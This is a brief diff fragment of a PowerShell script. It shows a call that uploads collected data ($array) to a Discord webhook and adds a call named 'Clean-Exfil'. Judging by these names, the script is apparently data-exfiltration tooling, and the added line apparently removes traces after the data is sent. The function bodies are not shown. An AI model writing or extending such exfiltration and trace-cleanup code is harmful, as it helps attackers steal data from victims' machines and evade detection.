@@ -155,3 +155,5 @@ $Value | ForEach-Object {
 }
 
 Discord-Upload -text $array -hook $link
+
+Clean-Exfil
